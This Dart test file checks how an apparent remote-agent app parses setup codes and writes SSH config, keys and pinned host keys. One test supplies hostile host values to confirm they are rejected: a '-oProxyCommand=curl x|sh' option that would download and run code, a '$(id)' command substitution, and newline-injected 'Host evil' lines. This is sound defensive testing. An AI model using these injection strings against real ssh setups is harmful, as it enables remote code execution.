import 'dart:convert';
import 'dart:io';

import 'package:andropi/agent/remote_profile.dart';
import 'package:flutter_test/flutter_test.dart';

String code(Map<String, Object?> json) => 'coderra1:${base64.encode(utf8.encode(jsonEncode(json)))}';

const key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIABn0o4m7AzJb8wgXq1z+8+KtuqK5nyX6AX9nOQI2zVG';

Map<String, Object?> valid([Map<String, Object?> over = const {}]) => {'v': 1, 'host': 'agent.example.com', 'port': 22, 'user': 'coderra', 'hostKey': key, ...over};

void main() {
  group('setup code', () {
    test('reads what the server script prints', () {
      final c = SetupCode.parse(code(valid()));
      expect([c.host, c.port, c.user, c.hostKey], ['agent.example.com', 22, 'coderra', key]);
    });

    test('reads the very code the real script prints', () {
      final run = Process.runSync('bash', ['server/bootstrap.sh', '--dry-run', '--pubkey', 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrN3F2pXbq4TmLwF7n2o0b5Fq8ZyQ1pY0nRw t', '--address', 'agent.example.com']);
      expect(run.exitCode, 0, reason: '${run.stderr}');
      final output = run.stdout as String;
      if (output.contains('(host key not found)')) {
        expect(() => SetupCode.parse(output), throwsA(isA<FormatException>().having((e) => e.message, 'message', contains('no host key'))));
        return;
      }
      final c = SetupCode.parse(output);
      expect([c.host, c.port, c.user], ['agent.example.com', 22, 'coderra']);
      expect(c.hostKey, startsWith('ssh-'));
    });

    test('is found inside the text around it, with spaces, and when a terminal wrapped it', () {
      final text = code(valid());
      expect(SetupCode.parse('\n   $text   \n\n  address: agent.example.com:22\n').host, 'agent.example.com');
      expect(SetupCode.parse('Done. Paste this:\n\n  $text\n\n  host key: $key\n').host, 'agent.example.com');
      final wrapped = '${text.substring(0, 40)}\n${text.substring(40, 90)}\n${text.substring(90)}\n\n  address: x';
      expect(SetupCode.parse(wrapped).user, 'coderra');
    });

    test('says what is wrong in words', () {
      String why(String input) {
        try {
          SetupCode.parse(input);
        } on FormatException catch (e) {
          return e.message;
        }
        fail('accepted: $input');
      }

      expect(why(''), contains('not a setup code'));
      expect(why('hello'), contains('not a setup code'));
      expect(why('coderra1:%%%'), contains('damaged'));
      expect(why('coderra1:${base64.encode(utf8.encode('not json'))}'), contains('damaged'));
      expect(why(code(valid({'v': 2}))), contains('different version'));
      expect(why(code(valid({'host': '(unknown: re-run with --address)'}))), contains('--address'));
      expect(why(code(valid({'hostKey': '(host key not found)'}))), contains('no host key'));
      expect(why(code(valid({'port': 0}))), contains('port'));
      expect(why(code(valid({'port': '22'}))), contains('port'));
      expect(why(code(valid({'port': 70000}))), contains('port'));
      expect(why(code(valid({'user': 'Root User'}))), contains('user'));
      expect(why(code(valid({'hostKey': 'ssh-ed25519'}))), contains('host key'));
      expect(why(code(valid({'hostKey': 'nonsense AAAA'}))), contains('host key'));
    });

    test('refuses an address or key that could rewrite the ssh config', () {
      for (final host in ['-oProxyCommand=curl x|sh', 'a b', 'a\nHost evil', 'a"b', 'a;b', 'x\$(id)', '']) {
        expect(() => SetupCode.parse(code(valid({'host': host}))), throwsA(isA<FormatException>()), reason: host);
      }
      expect(() => SetupCode.parse(code(valid({'hostKey': '$key\nHost evil'}))), throwsA(isA<FormatException>()));
      expect(() => SetupCode.parse(code(valid({'user': 'a\nHost evil'}))), throwsA(isA<FormatException>()));
      for (final host in ['10.0.0.5', 'agent.example.com', 'my-vps', '2001:db8::1']) {
        expect(SetupCode.parse(code(valid({'host': host}))).host, host);
      }
    });
  });

  group('ssh files', () {
    late Directory home;
    late RemoteSetup setup;
    late RemoteProfile profile;

    setUp(() {
      home = Directory.systemTemp.createTempSync('cr-profile-');
      setup = RemoteSetup(home: home.path);
      profile = RemoteProfile.fromSetupCode(SetupCode.parse(code(valid({'port': 2222}))));
    });
    tearDown(() => home.deleteSync(recursive: true));

    test('the key is made once, is ed25519, is private to the app, and is the same on the next call', () async {
      final pub = await setup.ensureKey();
      expect(pub, startsWith('ssh-ed25519 '));
      expect(pub, endsWith(' coderra-app'));
      expect(pub.contains('\n'), isFalse);
      expect(File(setup.keyPath).statSync().mode & 0x1ff, 0x180, reason: 'readable by the owner only (0600)');
      expect(await setup.ensureKey(), pub);
      // Losing the public half is not losing the key.
      File('${setup.keyPath}.pub').deleteSync();
      expect(await setup.ensureKey(), startsWith(pub.split(' ').take(2).join(' ')));
      setup.forgetKey();
      expect(File(setup.keyPath).existsSync(), isFalse);
      expect(await setup.ensureKey(), isNot(pub));
    });

    test('the ssh config insists on this server, this key, and this host key', () {
      final text = setup.configText(profile);
      expect(text, contains('Host coderra-vps'));
      for (final line in [
        'HostName agent.example.com',
        'Port 2222',
        'User coderra',
        'IdentitiesOnly yes',
        'StrictHostKeyChecking yes',
        'GlobalKnownHostsFile /dev/null',
        'HostKeyAlgorithms ssh-ed25519',
        'BatchMode yes',
        'PasswordAuthentication no',
        'ForwardAgent no',
        'ServerAliveInterval 15',
        'ServerAliveCountMax 3',
      ]) {
        expect(text, contains('  $line\n'), reason: line);
      }
      expect(text, contains('IdentityFile "${home.path}/.ssh/coderra_vps"'));
      expect(text, contains('UserKnownHostsFile "${home.path}/.ssh/coderra_known_hosts"'));
      expect(text.split('\n').where((l) => l.startsWith('Host ')), ['Host coderra-vps']);
    });

    test('the pinned host key is written the way ssh reads it, with the port when it is not 22', () {
      expect(setup.knownHostsLine(profile), '[agent.example.com]:2222 $key\n');
      final standard = RemoteProfile.fromSetupCode(SetupCode.parse(code(valid())));
      expect(setup.knownHostsLine(standard), 'agent.example.com $key\n');
      setup.write(profile);
      expect(File(setup.knownHostsPath).readAsStringSync(), '[agent.example.com]:2222 $key\n');
      expect(File(setup.configPath).readAsStringSync(), contains('Host coderra-vps'));
      setup.remove();
      expect(File(setup.configPath).existsSync(), isFalse);
    });

    test('an rsa host key asks for the matching signature algorithms', () {
      final rsa = RemoteProfile.fromSetupCode(SetupCode.parse(code(valid({'hostKey': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ'}))));
      expect(setup.configText(rsa), contains('HostKeyAlgorithms rsa-sha2-512,rsa-sha2-256'));
    });

    test('what the app runs: ssh with that config, no terminal, and the attach program', () {
      final spec = RemoteSetup(home: '/h', ssh: '/bin/ssh').launch(profile, env: {'A': 'b'});
      expect(spec.argv, ['/bin/ssh', '-F', '/h/.ssh/coderra_config', '-T', 'coderra-vps', '.coderra/bin/coderra-attach']);
      expect(spec.env, {'A': 'b'});
    });

    test('the command shown for the server is safe to paste', () {
      expect(setup.bootstrapCommand('ssh-ed25519 AAAA coderra-app', address: 'agent.example.com'), "sudo ./bootstrap.sh --pubkey 'ssh-ed25519 AAAA coderra-app' --address 'agent.example.com'");
      expect(setup.bootstrapCommand("ssh-ed25519 AAAA it's"), "sudo ./bootstrap.sh --pubkey 'ssh-ed25519 AAAA it'\\''s'");
    });

    test('the profile survives a restart, and a damaged file is ignored', () {
      final store = RemoteProfileStore(File('${home.path}/.coderra/remote.json'));
      expect(store.load(), isNull);
      store.save(profile.copyWith(active: true));
      final back = store.load()!;
      expect([back.host, back.port, back.user, back.hostKey, back.active], ['agent.example.com', 2222, 'coderra', key, true]);
      expect(profile.address, 'agent.example.com:2222');
      File(store.file.path).writeAsStringSync('{ not json');
      expect(store.load(), isNull);
      store.clear();
      expect(store.file.existsSync(), isFalse);
    });

    test('what ssh complains about becomes something to do', () {
      ServerCheck c(int code, [String out = '', String err = '']) => setup.classify(profile, code, out, err);
      expect(c(0, 'CODERRA:ok\n').problem, ServerProblem.none);
      expect(c(0, 'CODERRA:daemon-down').problem, ServerProblem.daemonDown);
      expect(c(0, 'CODERRA:host-missing').problem, ServerProblem.hostMissing);
      expect(c(0, 'CODERRA:attach-missing').problem, ServerProblem.notInstalled);
      expect(c(0, 'welcome banner').problem, ServerProblem.other);
      expect(c(255, '', 'Host key verification failed.').problem, ServerProblem.hostKeyChanged);
      expect(c(255, '', '@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @').problem, ServerProblem.hostKeyChanged);
      expect(c(255, '', 'coderra@x: Permission denied (publickey).').problem, ServerProblem.authRejected);
      expect(c(255, '', 'ssh: connect to host x port 22: Connection refused').problem, ServerProblem.unreachable);
      expect(c(255, '', 'ssh: Could not resolve hostname x').problem, ServerProblem.unreachable);
      expect(c(255, '', 'ssh: connect to host x port 22: Connection timed out').problem, ServerProblem.unreachable);
      expect(c(1, '', 'something odd').problem, ServerProblem.other);
      expect(c(255, '', 'Host key verification failed.').message, contains('Do not continue'));
    });
  });
}
